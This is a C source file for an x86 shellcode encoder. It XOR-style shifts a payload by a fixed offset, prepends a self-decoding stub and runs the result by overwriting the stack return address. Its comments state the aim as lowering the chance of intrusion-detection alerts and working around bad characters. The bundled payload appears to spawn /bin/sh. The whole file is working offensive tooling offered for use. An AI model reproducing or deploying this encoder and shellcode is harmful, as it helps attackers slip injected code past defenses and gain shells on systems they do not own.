#include <stdlib.h>
#include <string.h>

/*
 *  Shellcode encoder 0.1 by zillion (safemode.org)
 *
 *  Wish list :
 *  -----------
 *
 *  - Make the decoder polymorphic  
 *  - Add OS detection (see safemode)
 *
 *  How to use it :
 *  ---------------
 *
 *  Replace the shellcode with any shellcode, compile this file
 *  and execute it. The decoder is OS independent and can thus be
 *  used for any OS on Intel. The purpose: 
 *
 *  - Lower chance of IDS detection 
 *  - Counter difficult characters
 *  - Confuse sans students  ;-) 
 *
 *  The decoder :
 *  -------------
 *  
 *  jmp short go
 *  next:
 *
 *  pop             esi           
 *  xor             ecx,ecx
 *  mov             cl,11 
 *  change:
 *  sub byte        [esi + ecx - 1 ],11
 *  sub             cl, 1
 *  jnz change
 *  jmp short ok
 *  go:
 *  call next
 *  ok:
 *  <shellcode comes here>
 *
 */

void execute(char *  data);

int main() {

char decoder[] =
        "\xeb\x11\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\x80\xe9\x01"
        "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff";

char shellcode[] =
        "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd"
        "\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";

char tmp;
char *end;
int size  = 53;
int i; 
int l = 15;

for(i=0;i<strlen(shellcode);i++) {

   shellcode[i] += size;

}
        decoder[6]  += strlen(shellcode);
        decoder[11] += size;

end = (char *) malloc(strlen(shellcode) + strlen(decoder));

strcat(end,decoder);
strcat(end,shellcode);

        printf("\n\nchar shellcode[] =\n");

        for(i = 0; i < strlen(end); ++i) {
          if(l >= 15) {
            if(i) printf("\"\n");
            printf( "\t\"");
            l = 0;
          }
          ++l;
          printf("\\x%02x", ((unsigned char *)end)[i]);
        }

execute(end);
free(end);
}


void execute(char *data) {

int *ret;
ret = (int *)&ret + 2;
(*ret) = (int)data;

}


